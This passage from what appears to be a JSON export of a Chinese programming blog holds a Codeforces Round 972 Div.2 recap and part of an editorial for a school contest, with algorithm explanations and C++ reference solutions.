Div.2","id":"cf972-2","createTime":"2024-09-25T13:25:00.000Z","updateTime":"2025-09-05T13:34:06.117Z","content":"\n## CF2005A\n\n一开始太着急，直接猜结论是不断输出aeiou，写完交了一波结果样例都没过，挂大分了（），下回不能这么着急了。\n\n如果不断输出aeiou的话，比如 $n=6$，会输出 `aeioua`，此时两个 `a` 及中间任何一个字符都能组成一个回文串，对答案贡献太多了，显然不是最优的。\n\n再观察样例，不难发现，如果我们让相同字母都挨在一起，就不会出现上述情况了，于是构造方案就诞生了：先输出aeiou，如果 $n$ 还大的话就让相同字母挨在一起，比如 $n=6$ 时输出 `aaeiou` ，$n=12$ 时输出 `aaaeeeiioouu`。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int mod=0;\ntypedef pair<int,int> pii;\ninline void subtask(){\n\tint n;cin>>n;\n\tint now=1;\n\tint t=n/5;\n\tint r=n%5;\n\tfor(int i=1;i<=5;i++){\n\t\tchar c;\n\t\tif(i==1) c='a';\n\t\telse if(i==2) c='e';\n\t\telse if(i==3) c='i';\n\t\telse if(i==4) c='o';\n\t\telse c='u';\n\t\tfor(int i=1;i<=t;i++) cout<<c;\n\t\tif(r) cout<<c,r--;\n\t}\n\tcout<<endl;\n}\nsigned main(){\n\tios::sync_with_stdio(false);\n\tint t;cin>>t;\n\twhile(t--) subtask();\n\treturn 0;\n}\n```\n\n## CF2005B1+B2\n\n感觉比第一题简单。\n\n先考虑 B1，发现只需要分类讨论即可。设两个老师初始位置为 $l$ 和 $r$。\n\n- 如果 David 位于两个老师的两侧且靠近 $1$ 的一侧，那么 David 一直往 $1$ 那边走就可以了。答案就为 $l-1$\n- 如果 David 位于两个老师的两侧且靠近 $n$ 的一侧，那么 David 一直往 $n$ 那边走就可以了。答案就为 $n-r$\n- 如果 David 位于两个老师的中间，那么 David 一直走到中间位置，然后等待老师来抓就好了（再乱动的话只会让被抓的时间变短），答案为 $\\left \\lfloor \\frac{l+r}{2} \\right \\rfloor - l$\n\n值得注意的是，题目输入的两个老师的位置不一定第一个比第二个小。因为这个第一次提交又wa了，还以为做法假了，耽误了不少时间。\n\n再考虑 B2，考虑完 B1 ，B2就很显然了。不难发现如果我们被两个老师夹在中间，那么我们基本是逃不出去了，只能跑到中间静等老师来抓，这样才能尽可能拖延时间。我们使用二分，找出我们被哪两个老师加在中间即可。如果位于最左侧/最右侧，同上述，往 $1$ 或 $n$ 方向走就可以了。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\n#define _ 100005\nusing namespace std;\nconst int mod=0;\ntypedef pair<int,int> pii;\nint a[_];\ninline void subtask(){\n\tint n,m,q;cin>>n>>m>>q;\n\tfor(int i=1;i<=m;i++) cin>>a[i];\n\tsort(a+1,a+m+1);\n\tfor(int i=1;i<=q;i++){\n\t\tint x;cin>>x;\n\t\tint l=-1,r=-1;\n\t\tint p=upper_bound(a+1,a+m+1,x)-a;\n\t\tif(p<=m) r=p;\n\t\tif(p!=1) l=p-1;\n\t\tif(l==-1){\n\t\t\tcout<<a[r]-1<<endl;\n\t\t}else if(r==-1){\n\t\t\tcout<<n-a[l]<<endl;\n\t\t}else{\n\t\t\tint mid=(a[l]+a[r])>>1;\n\t\t\tcout<<mid-a[l]<<endl;\n\t\t}\n\t}\n}\nsigned main(){\n\tios::sync_with_stdio(false);\n\tint t;cin>>t;\n\twhile(t--) subtask();\n\treturn 0;\n}\n```\n\n## CF2005C\n\n开始冒汗了（）\n\n首先我们设所选字符串中包含的 narek 总共有 $sum$ 个。Narek 共获得了 $s$ 分，那么 $ChatGPT$ 一定获得了 $sum-s$ 分。于是转化为最大化 $2s-sum$。\n\n凭感觉觉得题目有点像dp，试一试\n\n设 $dp[i][j][k]$ 表示选定了第 $i$ 行第 $j$ 个字符，匹配到了 `narek` 的第 $k$ 个字符，获得的最大收益。我们最后只需要找出所有 $dp[i][j][5]$ 中的最大收益即可。\n\n因为我们只关心 narek ，不妨设 $w_i$ 为第 $i$ 行有多少个 narek这些字符。\n\n考虑转移方向。有两个情况，从本行转移和从之前的某一行转移，后者意味着当前的字符是本行选中的第一个字符，也意味着在转移的时候 dp 值要减去当前行的 $w_i$。\n\n由于我们只有把 narek 五个字符都匹配完才能得到 $5$ 分，所以只有当前字符为 `k` 且成功从别的位置转移过来，才会给 dp 值加上 $10$（注意dp值表示的是当前的 $2s-sum$）\n\n然后考虑转移，如果当前枚举到的位置的字符为 `n` ，那么只能从 $k=5$ 转移（前面已经选了若干个 narek，从这个字符开始继续选新的 narek）或者初始化 dp 值为 $-w_i$（自己作为所有选中字符中的第一个字符）。如果为 `a` ，只能从 $k=1$ 转移。如果为 `r` ，只能从 $k=2$ 转移。以此类推。\n\n直接转移的话，我们需要枚举本行之前（不包括本行）的所有dp值，找出最大的那个，以及枚举本行当前位置之前的所有dp值，找出最大的那个。暴力转移时间复杂度显然是爆炸的。不过我们只关心最大值，所以对于每个 $k$ 值都维护一个最大值就好了。这样一来，dp数组甚至都可以不用开。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int mod=0;\nconst int inf=0x3f3f3f3f3f3f3f3f;\ntypedef pair<int,int> pii;\ninline int get(char c){\n\tif(c=='n') return 1;\n\telse if(c=='a') return 2;\n\telse if(c=='r') return 3;\n\telse if(c=='e') return 4;\n\telse if(c=='k') return 5;\n\telse return -1;\n}\nint w[1003];\nint ch[1003][1003];\ninline void subtask(){\n\tint bef[6]={-inf,-inf,-inf,-inf,-inf,-inf};\n\tint n,m;cin>>n>>m;\n\tfor(int i=1;i<=n;i++){\n\t\tstring str;cin>>str;\n\t\tw[i]=0;\n\t\tfor(int j=0;j<m;j++){\n\t\t\tch[i][j+1]=get(str[j]);\n\t\t\tif(get(str[j])!=-1) w[i]++;\n\t\t}\n\t}\n\tint ans=0;\n\tfor(int i=1;i<=n;i++){\n\t\tint now[6]={-inf,-inf,-inf,-inf,-inf,-inf};\n\t\tfor(int j=1;j<=m;j++){\n\t\t\tint k=ch[i][j];\n\t\t\tif(k==-1) continue;\n\t\t\tint maxx=-inf;\n\t\t\tif(k==1){\n\t\t\t\tmaxx=-w[i];\n\t\t\t\tif(now[5]!=-inf){\n\t\t\t\t\tmaxx=max(maxx,now[5]);\n\t\t\t\t}\n\t\t\t\tif(bef[5]!=-inf){\n\t\t\t\t\tmaxx=max(maxx,bef[5]-w[i]);\n\t\t\t\t}\n\t\t\t}else{\n\t\t\t\tif(now[k-1]!=-inf){\n\t\t\t\t\tmaxx=max(maxx,now[k-1]);\n\t\t\t\t}\n\t\t\t\tif(bef[k-1]!=-inf){\n\t\t\t\t\tmaxx=max(maxx,bef[k-1]-w[i]);\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(maxx!=-inf){\n\t\t\t\tif(k==5){\n\t\t\t\t\tmaxx+=10;\n\t\t\t\t\tans=max(ans,maxx);\n\t\t\t\t}\n\t\t\t\tnow[k]=max(now[k],maxx);\n\t\t\t}\n\t\t}\n\t\tfor(int j=1;j<=5;j++){\n\t\t\tbef[j]=max(bef[j],now[j]);\n\t\t}\n\t}\n\tcout<<ans<<endl;\n}\nsigned main(){\n\tios::sync_with_stdio(false);\n\tint t;cin>>t;\n\twhile(t--) subtask();\n\treturn 0;\n}\n\n/*\n4\n5 2\nnn\naa\nrr\nee\nkk\n*/\n```\n\n## CF2005D\n\n赛时打完C还剩30min，而且D才几百人通过，直接摆烂了（）\n\n后面各种看题解才搞懂了这个题。总的来说这个题也不是很难感觉。\n\n首先达成共识，gcd是能合并的。也就是 $gcd(a,b,c)=gcd(gcd(a,b),c)$，类似于取大和取小函数的性质。这意味着我们可以用线段树、st表等数据结构去维护他。\n\n再达成共识：给定一个序列，求这个序列所有的前缀gcd，这个前缀gcd的取值肯定是单调不增的，且取值不会很多。如果序列的值域为 $A$，那么前缀gcd的种类大概是 $logA$ 数量级的。\n\n下面我们定义 $gcd([a,b])$ 为区间 $[a,b]$ 内所有数取gcd。\n\n我们先考虑相同的交换方法，我们选取了区间 $[L_1,R_1]$ 准备交换，和选取 $[L_2,R_2]$ 准备交换，什么时候这两种交换方法是本质相同的呢？我说，如果 $gcd([1,L_1-1])$ 和$gcd([1,L2-1])$ 相同，且 $gcd([L_1,R_1])$ 和 $gcd([L_2,R_2])$ 相同，且 $gcd([R_1+1,n])$ 和 $gcd([R_2+1,n])$ 相同。这三个条件同时满足，那么这两个交换是等价的。\n\n通过第二个共识，我们知道 $gcd$ 的种类不会很多。\n\n我们直接考虑去枚举要交换的区间 $[L,R]$ 。直接枚举肯定会t，但先别着急，慢慢来，我们先枚举左端点 $L$。然后我们把左端点右侧的区域分成若干段。\n\n![](https://www.caiwen.work/wp-content/uploads/2024/09/image-20240924204233070.png)\n\n我们需要保证，落在同一段的 $R$ 满足交换区间 $[L,R]$ 是本质相同的（关于本质相同的说法刚说过）。还是那句话， $gcd$ 的种类不会很多，所以你感性上就能感觉出来，我们不会分太多的段。对于每一段，我们既可以统计能得到的最大 $gcd_a+gcd_b$，也能统计得到这个最大值的方案数。\n\n问题的关键在于如何去分段，直接暴力分显然不妥。我们可以考虑用二分去分段。\n\n中间可能涉及到如何快速得到某段区间的gcd值，直接用st表或者线段树维护即可（线段树可能复杂度有点大，可能会t一点）\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define ll long long\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\n#define _ 500005\nusing namespace std;\n//const int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\nint a[_],b[_],n,lg[_],sta[_][20],stb[_][20];\ninline int gcd(int x,int y){\n\tif(!x||!y) return x+y;\n\twhile(x%y){\n\t\tint t=x%y;\n\t\tx=y;\n\t\ty=t;\n\t}\n\treturn y;\n}\nvoid build(int st[_][20],int arr[]){\n\tfor(int i=1;i<=n;i++) st[i][0]=arr[i];\n\tfor(int i=1;i<=lg[n];i++){\n\t\tfor(int j=1;j<=n-(1<<i)+1;j++){\n\t\t\tst[j][i]=gcd(st[j][i-1],st[j+(1<<(i-1))][i-1]);\n\t\t}\n\t}\n}\nint query(int st[_][20],int l,int r){\n\tif(l>r) return 0;\n\tint k=lg[r-l+1];\n\treturn gcd(st[l][k],st[r-(1<<k)+1][k]);\n}\ninline void subtask(){\n\tcin>>n;\n\tfor(int i=1;i<=n;i++) cin>>a[i];\n\tfor(int i=1;i<=n;i++) cin>>b[i];\n\tbuild(sta,a);build(stb,b);\n\tint ans=query(sta,1,n)+query(stb,1,n);\n\tll cnt=0;\n\tfor(int L=1;L<=n;L++){\n\t\tint R=L,lasa1=a[L],lasb1=b[L],lasa2=query(sta,L+1,n),lasb2=query(stb,L+1,n);\n\t\twhile(R<=n){\n\t\t\tint l=R,r=n,res;\n\t\t\twhile(l<=r){\n\t\t\t\tint mid=(l+r)>>1;\n\t\t\t\tif(\n\t\t\t\t\tquery(sta,L,mid)==lasa1&&\n\t\t\t\t\tquery(stb,L,mid)==lasb1&&\n\t\t\t\t\tquery(sta,mid+1,n)==lasa2&&\n\t\t\t\t\tquery(stb,mid+1,n)==lasb2\n\t\t\t\t){\n\t\t\t\t\tres=mid;\n\t\t\t\t\tl=mid+1;\n\t\t\t\t}else r=mid-1;\n\t\t\t}\n\t\t\tint gcda=gcd(gcd(query(sta,1,L-1),query(stb,L,res)),query(sta,res+1,n));\n\t\t\tint gcdb=gcd(gcd(query(stb,1,L-1),query(sta,L,res)),query(stb,res+1,n));\n\t\t\tif(gcda+gcdb>ans) ans=gcda+gcdb,cnt=res-R+1;\n\t\t\telse if(gcda+gcdb==ans) cnt+=res-R+1;\n\t\t\tR=res+1;\n\t\t\tlasa1=query(sta,L,R);\n\t\t\tlasb1=query(stb,L,R);\n\t\t\tlasa2=query(sta,R+1,n);\n\t\t\tlasb2=query(stb,R+1,n);\n\t\t}\n\t}\n\tcout<<ans<<\" \"<<cnt<<endl;\n}\nsigned main(){\n\tfor(int i=2;i<=500000;i++) lg[i]=lg[i>>1]+1;\n\tios::sync_with_stdio(false);\n\tint t;cin>>t;\n\twhile(t--) subtask();\n\treturn 0;\n}\n```\n\n## CF2005E1\n\n赛时看了一眼，结合他是E题就感觉应该是做不出来了。实际上这个题比D还简单。通过人数果然是真能反应题目难度的。\n\n看到博弈脑子就短路了（）打算后面搞个博弈专题。\n\n这道题需要dp+博弈，感觉有点熟悉。\n\n$dp[l][i][j]$ 表示序列 $a$ 中选到了第 $l$ 个数，选到了左上角为 $(i,j)$ 右下角为 $(n,m)$ 的矩阵，这种情形下是否有必胜策略。\n\n首先肯定的一点，如果 $b_{i,j} \\neq a_l$ 的话，那么肯定是没有必胜策略的，dp值为0。\n\n反之，我们继续考虑，如果 $dp[l+1][i+1...n][j+1...m]$ 存在必胜策略，那么 $dp[l][i][j]$ 必然没有必胜策略（因为你选完之后，下一回合对手就能有必胜策略了）。如果这些位置都没有必胜策略，那么当前的 $dp[l][i][j]$ 就有必胜策略了。\n\n倒着dp，直接转移时间复杂度爆炸，使用二维前缀和优化即可。\n\n```cpp\n#include<bits/stdc++.h>\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\n//const int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\nint l,n,m,a[303],b[303][303],sum[303][303][303],dp[303][303][303];\ninline void subtask(){\n\tcin>>l>>n>>m;\n\tfor(int i=1;i<=l;i++) cin>>a[i];\n\tfor(int i=1;i<=n;i++){\n\t\tfor(int j=1;j<=m;j++) cin>>b[i][j];\n\t}\n\tfor(int k=l;k>=1;k--){\n\t\tfor(int i=n;i>=1;i--){\n\t\t\tfor(int j=m;j>=1;j--){\n\t\t\t\tif(b[i][j]==a[k]){\n\t\t\t\t\tif(k==l){\n\t\t\t\t\t\tdp[k][i][j]=1;\n\t\t\t\t\t}else{\n\t\t\t\t\t\tif(j==m||i==n){\n\t\t\t\t\t\t\tdp[k][i][j]=1;\n\t\t\t\t\t\t}else if(!sum[k+1][i+1][j+1]){\n\t\t\t\t\t\t\tdp[k][i][j]=1;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tsum[k][i][j]=sum[k][i+1][j]+sum[k][i][j+1]-sum[k][i+1][j+1]+dp[k][i][j];\n\t\t\t}\n\t\t}\n\t}\n\tint ans=0;\n\tfor(int i=1;i<=n;i++){\n\t\tfor(int j=1;j<=m;j++){\n\t\t\tif(dp[1][i][j]){\n\t\t\t\tans=1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\tif(ans) cout<<\"T\"<<endl;\n\telse cout<<\"N\"<<endl;\n\tfor(int i=1;i<=l;i++){\n\t\tfor(int j=1;j<=n;j++){\n\t\t\tfor(int k=1;k<=m;k++) dp[i][j][k]=0,sum[i][j][k]=0;\n\t\t}\n\t}\n}\nsigned main(){\n\t//cout<<sizeof(sum)/1024/1024<<endl;\n\tios::sync_with_stdio(false);\n\tint t;cin>>t;\n\twhile(t--) subtask();\n\treturn 0;\n}\n```\n\n## CF2005E2\n\nmlgb，看了一圈题解和讲解视频，一个都没看懂，摆了，有机会再补吧。\n\n","summary":"Codeforces Round 972 Div.2总结，A、B1+B2、C、D、E1","key":["codeforces","cf","972","div2"],"tags":[{"value":"未补完","color":"error"}],"path":["算法竞赛","做题、VP","Codeforces","Codeforces Round 972 Div.2.md"],"background":"https://www.caiwen.work/wp-content/uploads/2024/09/未命名4.jpg","recommend":false,"status":"published"},{"type":"Article","title":"CZSC 2024 第二次 题解","id":"czsc2024-2-tijie","createTime":"2024-08-27T08:42:00.000Z","updateTime":"2025-09-05T13:34:06.477Z","content":"\n::: success 说明\n本篇文章是举行在2024年8月26日的 CZSC2024第二次 的题解\n\n比赛页：https://www.luogu.com.cn/contest/193818\n\nT1序列：https://www.luogu.com.cn/problem/T501912\n\nT2Caiwen家的饭：https://www.luogu.com.cn/problem/T501951\n\nT3乒乓：https://www.luogu.com.cn/problem/T502060\n\nT4变量：https://www.luogu.com.cn/problem/T502118\n:::\n\n## T1 序列\n\n### 算法一\n\n题目说啥你干啥，直接暴力就可以了。注意long long，注意取模。\n\n（如果你看不懂求和符号就寄了）\n\n参考代码（李锦玉同学赛时代码）：\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\nusing namespace std;\nconst int mod=19260817;\nint n,m;\nint k[30004],a[30004];\nint ans;\nsigned main(){\n\tios::sync_with_stdio(false);\n\tcin>>n>>m;\n\tfor(int i=1;i<=n;i++) cin>>k[i];\n\tfor(int i=1;i<=n;i++) cin>>a[i];\n\tans=0;\n\tfor(int i=1;i<=n;i++){\n\t\tint all=1;\n        // 直接开循环去算次方\n\t\tfor(int j=1;j<=k[i];j++){\n\t\t\tall=(all*a[i])%mod;\n\t\t}\n\t\tans=(ans+all)%mod;\n\t}\n\tcout<<ans<<endl;\n\tfor(int i=1;i<=m;i++){\n\t\tint x,y;\n\t\tcin>>x>>y;\n        // 修改\n\t\ta[x]=y;\n\t\tans=0;\n        // 再重新算一下\n\t\tfor(int j=1;j<=n;j++){\n\t\t\tint all=1;\n            for(int l=1;l<=k[j];l++){\n                all=(all*a[j])%mod;\n            }\n            ans=(ans+all)%mod;\n\t\t}\n\t\tcout<<ans<<endl;\n\t}\n\treturn 0;\n}\n```\n\n时间复杂度 $O(mnk)$ ，可通过测试点 $1\\sim 8$ 、 $11\\sim 13$ 、 $16\\sim20$ 期望得分 $64pts$\n\n### 算法二（正解）\n\n实际上，你每次修改之后都重新扫一下数组，计算一下答案，这个操作是多余的，换句话说，是有待优化的。\n\n我们可以有个更快的解决方案：我们假设上次的答案为 $ans$ ，位置 $x$ 对应的权重为 $k$ ，位置 $x$ 原来是 $z$ ，现在要修改为 $y$ 。那么我们可以考虑这么操作：先把 $ans$ 减去 $z^k$ （即把原来的数字对答案的贡献减掉），然后再把 $ans$ 加上 $y^k$，然后得到的 $ans$ 就是新的答案了。\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define _ 30004\nusing namespace std;\nconst int mod=19260817;\nint k[_],a[_],ans;\n// 简单起见，你可以把求次方封装成一个函数\ninline int f(int x,int w){\n\tint res=1;\n\tfor(int i=1;i<=w;i++) res*=x,res%=mod;\n\treturn res;\n}\nsigned main(){\n\tios::sync_with_stdio(false);\n\tint n,m;cin>>n>>m;\n\tfor(int i=1;i<=n;i++) cin>>k[i];\n\tfor(int i=1;i<=n;i++) cin>>a[i];\n\tfor(int i=1;i<=n;i++) ans+=f(a[i],k[i]),ans%=mod;\n\tcout<<ans<<endl;\n\tfor(int i=1;i<=m;i++){\n\t\tint x,y;cin>>x>>y;\n        // 先减\n        // 你注意减法取模，是(a-b+mod)%mod\n\t\tans=(ans-f(a[x],k[x])+mod)%mod;\n        // 别忘了也要把a数组更改一下\n\t\ta[x]=y;\n        // 再加\n\t\tans=(ans+f(a[x],k[x]))%mod;\n\t\tcout<<ans<<endl;\n\t}\n\treturn 0;\n}\n```\n\n时间复杂度 $O(mk)$，可以通过所有测试点，期望得分 $100pts$。\n\n### 更多\n\n本题求一个数的 $n$ 次方部分是直接用循环做的。时间复杂度是 $O(n)$ 的。实际上，我们有一个叫做“快速幂”的算法，能做到 $O(logn)$ 的复杂度求解，非常快速。这个算法不难，感兴趣的同学可以去学一下。\n\n## T2 Caiwen家的饭\n\n### 算法一\n\n还是题目让你干什么你就干什么，直接暴力，开 long long 和注意取模都别忘了。\n\n参考代码（李锦玉同学赛时代码）：\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\nusing namespace std;\nint n;\nint a[1000006];\nconst int mod=19260817;\nsigned main(){\n\tios::sync_with_stdio(false);\n\tcin>>n;\n\tfor(int i=1;i<=n;i++) cin>>a[i];\n\tint ans=0;\n\tfor(int i=1;i<=n;i++){\n\t\tfor(int j=i+1;j<=n;j++){\n\t\t\tans=(ans+a[i]*a[j]%mod)%mod;\n\t\t}\n\t}\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n时间复杂度 $O(n^2)$，可以通过测试点 $1\\sim15$，期望得分 $60pts$。\n\n### 算法二（正解）\n\n首先我们重新审视一下这个问题。去掉题目的包装，本题就是让求这 $n$ 个数两两相乘，最后再相加。\n\n比如 $n=5$，就是\n\n$$\na_1a_2+a_1a_3+a_1a_4+a_1a_5+a_2a_3+a_2a_4+a_2a_5+a_3a_4+a_3a_5+a_4a_5\n$$\n\n我们分一下组：\n\n$$\n(a_1a_2+a_1a_3+a_1a_4+a_1a_5)+(a_2a_3+a_2a_4+a_2a_5)+(a_3a_4+a_3a_5)+(a_4a_5)\n$$\n\n把每一组的公共项提出来：\n\n$$\na_1(a_2+a_3+a_4+a_5)+a_2(a_3+a_4+a_5)+a_3(a_4+a_5)+a_4(a_5)\n$$\n\n你发现了吗，后面括号里的部分分别是从$a_2$ 加到 $a_5$，从$a_3$ 加到 $a_5$，从$a_4$ 加到 $a_5$...\n\n如果我们直接去计算，需要开两层循环，时间复杂度必定是 $O(n^2)$ 的，但你考虑怎么优化。对于这种需要反复求一段连续区间内所有数之和的问题，我们的解决方案一定是三个字：前缀和！\n\n不过这个题和你了解的前缀和可能稍微不一样，这个题可能要搞个后缀和。\n\n我们先以 $O(n)$ 的时间复杂度求出后缀和 $suf[i]$ 表示从 $a_i$ 加到 $a_n$，然后再以 $O(n)$ 的时间复杂度去计算上式即可。\n\n$$\na_1\\times suf_2+a_2\\times suf_3+a_3\\times suf_4+a_4\\times suf_5\n$$\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define _ 1000006\nusing namespace std;\nconst int mod=19260817;\nint suf[_],a[_],n;\nsigned main(){\n\tios::sync_with_stdio(false);\n\tcin>>n;\n\tfor(int i=1;i<=n;i++) cin>>a[i];\n\tfor(int i=n;i>=1;i--) suf[i]=(suf[i+1]+a[i])%mod;\n\tint ans=0;\n\tfor(int i=1;i<n;i++){\n\t\tans+=a[i]*suf[i+1]%mod;\n\t\tans%=mod;\n\t}\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n时间复杂度 $O(n)$ ，可以通过所有测试点，期望得分 $100pts$。\n\n### 更多\n\n季新明同学的代码是这样的：\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define mod  19260817\nusing namespace std;\nint ai[1000006];\nsigned main(){\n\tios::sync_with_stdio(false);\n\tint n,a=0,b=0;\n\tcin>>n;\n\tfor(int i=1;i<=n;i++){\n\t\tcin>>ai[i];\n\t\tai[i]%=mod;\n\t\ta=(a+ai[i])%mod;\n\t}\n\tfor(int i=1;i<=n;i++){\n\t\tb=(b+ai[i]*(a-ai[i]+mod)%mod)%mod;\n\t}\n\tcout<<b/2;\n\treturn 0;\n}\n```\n\n它的思路大概是，我们还是先假设 $n=5$，即先求\n\n$$\na_1a_2+a_1a_3+a_1a_4+a_1a_5+a_2a_1+a_2a_3+a_2a_4+a_2a_5+a_3a_1+a_3a_2+a_3a_4+a_3a_5+a_4a_1+a_4a_2+a_4a_3+a_4a_5\n$$\n\n即求：\n\n$$\na_1(a_2+a_3+a_4+a_5)+a_2(a_1+a_3+a_4+a_5)+a_3(a_1+a_2+a_4+a_5)+a_4(a_1+a_2+a_3+a_5)\n$$\n\n为了快速求解这个式子，它先求了这五个数之和 $a$。然后只需求：\n\n$$\na_1(a-a_1)+a_2(a-a_2)+a_3(a-a_3)+a_4(a-a_4)\n$$\n\n不过它求完之后，和题目相比，相当于重复了，重复了一遍，所以最后需要再除2。\n\n结合他的代码，好像问题不大，但这份代码是 WA 的，为什么呢？\n\n实际上，如果一个取模的题遇到了除法，事情就变得复杂了，涉及到了一个叫做“逆元”的东西。这个我们之后会学，感兴趣的可以了解一下。上述代码最后不能直接除2，而是应该**乘上**在模数为19260817时2的逆元\n\n## T3 乒乓\n\n这个题目有点迷惑性，首先你需要通过样例或者个人理解，看出来本题实际上是：\n\n给你 $n$ 个数 $a_i$，和 $m$ 个询问，每个询问给出一个数 $b_i$ 问有多少个 $a_i$ 小于等于给定 $b_i$。\n\n### 算法一\n\n题目怎么说你就怎么做，直接暴力\n\n参考代码（李锦玉同学赛时代码）：\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\nusing namespace std;\nint n,m;\nint a[100005],b[100005],ans[100005];\nsigned main(){\n\tios::sync_with_stdio(false);\n\tcin>>n>>m;\n\tfor(int i=1;i<=n;i++) cin>>a[i];\n\tfor(int i=1;i<=m;i++) cin>>b[i];\n\tfor(int i=1;i<=n;i++){\n\t\tfor(int j=1;j<=m;j++){\n\t\t\tif(b[j]>=a[i]){\n\t\t\tans[j]++;\n\t\t}\n\t\t}\n\t}\n\tfor(int i=1;i<=m;i++) cout<<ans[i]<<\" \";\n\treturn 0;\n}\n```\n\n时间复杂度 $O(nm)$，可以通过所有测试点 $1\\sim 12$，期望得分 $48pts$。\n\n### 算法二（正解）\n\n我说第一步你要排序一下吧，况且题目的数据范围都有这个提示了\n\n我们直接把输入的 $a_i$ 和 $b_i$ 分别排序一波。\n\n然后现在请你在你的脑海中复现两个数列和两个指针，初始时两个指针都指向数列最左端：\n\n![](http://pic.caiwen.work/i/2025/01/24/679354c69ebbe.png)\n\n每次下方的指针向前移动一下，表示处理一个询问，然后上方的指针也向右移动，确保上面指针指向的数永远不大于下方指针指向的数，直到不能再移动了。然后上面指针扫过的数的数量即为该询问的答案\n\n以样例 2 为例\n\n第一次：\n\n![](http://pic.caiwen.work/i/2025/01/24/679354ecce212.png)\n\n询问 $b_i=1$ 的答案为 1\n\n第二次：\n\n![](http://pic.caiwen.work/i/2025/01/24/67935506cc031.png)\n\n询问 $b_i=1$ 的答案为 1\n\n![](http://pic.caiwen.work/i/2025/01/24/6793552ab4a03.png)\n\n询问 $b_i=2$ 的答案为 3\n\n![](http://pic.caiwen.work/i/2025/01/24/679355524ee32.png)\n\n询问 $b_i=2$ 的答案为 3\n\n![](http://pic.caiwen.work/i/2025/01/24/6793556d8b591.png)\n\n询问 $b_i=6$ 的答案为 6\n同理，询问 $b_i=7$ 的答案为 6\n\n然后我们就把答案都求出来了。我们发现，**得益于这两个数列排好序了，是单调不降的** 这两个指针只会往前走，不会往后走，程序跑一边，两个数列只会被扫一次，因此时间复杂度为 $O(n+m)$\n\n但新的问题又出现了，因为我们也把序列 b 排序了，询问的先后顺序被打乱了，所以你不能直接输出。为了应对这个，你可能还要记录一下询问原来是第几个询问，这涉及到结构体。\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define _ 100005\nusing namespace std;\nint a[_];\nstruct O{\n\tint v; // 存储 bi\n\tint index;  // 存储这是第几个询问\n\tint ans;  // 存储该询问的答案\n} b[_];\nbool cmp1(O x,O y){  // 第一次排序\n\treturn x.v<y.v;  // 按 bi 排序\n}\nbool cmp2(O x,O y){  // 第二次排序\n\treturn x.index<y.index;  // 按询问出现顺序排序\n}\nsigned main(){\n\tios::sync_with_stdio(false);\n\tint n,m;\n\tcin>>n>>m;\n\tfor(int i=1;i<=n;i++) cin>>a[i];\n\tfor(int i=1;i<=m;i++) cin>>b[i].v,b[i].index=i;\n\tsort(a+1,a+n+1);\n\tsort(b+1,b+m+1,cmp1);\n\tint ans=0,p=1;\n\tfor(int i=1;i<=m;i++){  // 下方的指针往前移动\n\t\twhile(a[p]<=b[i].v && p<=n) ans++,p++;  // 上方的指针往前移动，同时统计扫过了多少个数\n\t\tb[i].ans=ans;  // 记录答案\n\t}\n\tsort(b+1,b+m+1,cmp2);  // 再把询问的顺序换元\n\tfor(int i=1;i<=m;i++) cout<<b[i].ans<<' ';\n\treturn 0;\n}\n```\n\n时间复杂度为 $O(n+m)$，可以通过所有测试点，期望得分 $100pts$。\n\n### 更多\n\n本题问题的核心在于，如何快速地找到有多少个数小于等于某个数。\n\n实际上，我们还可以采用二分查找的方法来解决这个问题。二分算法也是我们后面要学习的，各位感兴趣可以了解一下。\n\n## T4 变量\n\n### 解决\n\n这个题其实没有考算法，只考了语法，看你如何使用c++语法去解决。没有什么思维难度，就看你语法掌握的如何。\n\n我们先一步一步来考虑\n\n**问题1：如何输入**\n\n本题的输入格式有点特别的，一般人也就输入一个数字 $n$，然后开个循环，后面的东西就就不知道怎么读入了。\n\n注意观察，等号两边都有空格隔开。而c++中的输入是自动按空格分割数据的，所以我们每行赋值操作可以直接用cin读入。你读入三次，第二次读入的是等号，可以直接丢弃，于是我们把等号两边的数据都读入进来了\n\n**问题2：如何存**\n\n等号左边是一个字符串，这个好说。等号右边既可能是数字也可能是字符串。那该怎么搞？我们知道。即使是数字我们也能把他看成一个字符串存起来。\n\n**问题3：我怎么知道是把变量赋值给变量还是把数字赋值给一个变量**\n\n因为变量名都是小写英文字母，所以我们只需要判断读入的等号右边的那个字符串的第一个字符是不是数字就好了。判断方法可以通过比较ascii码实现。\n\n**问题4：”变量“的数据怎么存储**\n\n首先你需要注意到 $k\\le 3$ ，这意味着变量名的长度最大为 $3$。我们不妨先搞个这样的对应关系：字符 a 对应数字 1，字符 b 对应数字 